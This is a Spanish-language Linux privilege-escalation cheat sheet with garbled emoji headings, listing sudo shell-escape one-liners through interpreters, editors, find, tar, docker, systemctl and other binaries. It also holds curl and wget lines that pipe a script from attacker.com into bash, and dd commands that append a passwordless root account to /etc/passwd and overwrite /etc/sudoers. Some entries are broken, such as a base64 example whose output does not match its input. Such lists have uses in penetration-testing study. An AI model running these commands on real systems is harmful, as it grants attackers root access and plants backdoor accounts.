ðŸ”´ IntÃ©rpretes de Lenguajes
Python
bash
# Python 2
sudo python -c 'import os; os.system("/bin/sh")'
sudo python -c 'import pty; pty.spawn("/bin/bash")'
# Python 3
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
Ruby
bash
sudo ruby -e 'exec "/bin/sh"'
sudo ruby -e 'exec "/bin/bash"'
sudo ruby -e 'require "irb"; IRB.start'
Perl
bash
sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/bash";'
PHP
bash
sudo php -r 'system("/bin/sh");'
sudo php -r 'exec("/bin/bash");'
sudo php -r 'passthru("/bin/sh");'
Node.js
bash
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
sudo node -e 'const sh = require("child_process").execSync("/bin/bash", {stdio: "inherit"});'
Lua
bash
sudo lua -e 'os.execute("/bin/sh")'
sudo lua -e 'os.execute("/bin/bash")'
AWK
bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo awk 'BEGIN {system("/bin/bash")}'
ðŸ”µ Editores de Texto
Vi/Vim
bash
sudo vi -c ':!/bin/sh' -c ':q'
sudo vim -c ':!/bin/bash' -c ':q'
# Dentro de vim/vi:
:set shell=/bin/bash
:shell
# o simplemente:
:!bash
Nano
bash
# Dentro de nano:
^R^X presiona Ctrl+R luego Ctrl+X e inserta reset; bash 1>&0 2>&0
Emacs
bash
sudo emacs -Q -nw --eval '(term "/bin/bash")'
# O dentro de emacs:
M-x shell
Less/More
bash
sudo less /etc/profile
# Dentro de less, presionar:
!/bin/bash
Ed
bash
sudo ed
!'/bin/sh'
ðŸŸ¢ Herramientas del Sistema
Find
bash
sudo find . -exec /bin/sh \; -quit
sudo find . -type f -exec /bin/bash -p \; -quit
Man
bash
sudo man man
# Dentro de man, presionar:
!/bin/bash
Nmap
bash
# Nmap versiones antiguas (con modo interactivo)
sudo nmap --interactive
!sh
Git
bash
sudo git -p help
# Dentro del pager:
!/bin/bash
# O directamente:
sudo git branch --help
!/bin/bash
SSH
bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
TCPDump
bash
# Con postrotate-command
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell.sh
Tar
bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
Zip
bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
ðŸŸ¡ Utilidades de AdministraciÃ³n
Docker
bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
sudo docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
Screen
bash
sudo screen -x root/session
Tmux
bash
sudo tmux attach -t root
Systemctl
bash
# Crear servicio malicioso
sudo systemctl edit --force --full test.service
# Agregar:
[Service]
Type=oneshot
ExecStart=/bin/bash
[Install]
WantedBy=multi-user.target
# Ejecutar:
sudo systemctl start test.service
Journalctl
bash
sudo journalctl
# Presionar:
!/bin/bash
ðŸŸ£ Comandos de Red y Transferencia
Curl/Wget
bash
# Descargar y ejecutar shell
sudo curl http://attacker.com/shell.sh | bash
sudo wget -O- http://attacker.com/shell.sh | bash
SCP
bash
sudo scp -S /path/to/shell.sh x y:
Rsync
bash
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
ðŸ”¶ Compiladores y Lenguajes
GCC
bash
sudo gcc -wrapper /bin/sh,-s .
Make
bash
# Crear Makefile
echo -e '#!/bin/bash\n/bin/bash' > /tmp/shell
chmod +x /tmp/shell
sudo make -s --eval=$'x:\n\t-'"/tmp/shell"
GDB
bash
sudo gdb -nx -ex '!sh' -ex quit
sudo gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
ðŸ”·Archivos y CompresiÃ³n
Gzip/Gunzip
bash
sudo gzip -f /etc/shadow -t
Base64
bash
echo "/bin/bash" | base64
# QmFzaCBzaGVsbAo=
sudo base64 -d <<< "L2Jpbi9iYXNoCg==" | bash
ðŸŸ  MiscelÃ¡neos
Script/Scriptreplay
bash
sudo script -q /dev/null /bin/bash
Socat
bash
sudo socat stdin exec:/bin/bash
Strace
bash
sudo strace -o /dev/null /bin/bash
Time
bash
sudo /usr/bin/time /bin/bash
Watch
bash
sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
ðŸ“‹ VerificaciÃ³n de Sudo
Para ver quÃ© comandos puedes ejecutar con sudo:
bash
sudo -l
Para buscar binarios con permisos SUID:
bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
#permisos en /bin/dd/
# Crear usuario root SIN contraseÃ±a
echo 'pwned::0:0:root:/root:/bin/bash' | sudo dd of=/etc/passwd oflag=append conv=notrunc
tambien
echo "usuario ALL=(ALL:ALL) ALL" | sudo /bin/dd of=/etc/sudoers
# Cambiar a ese usuario
su pwned
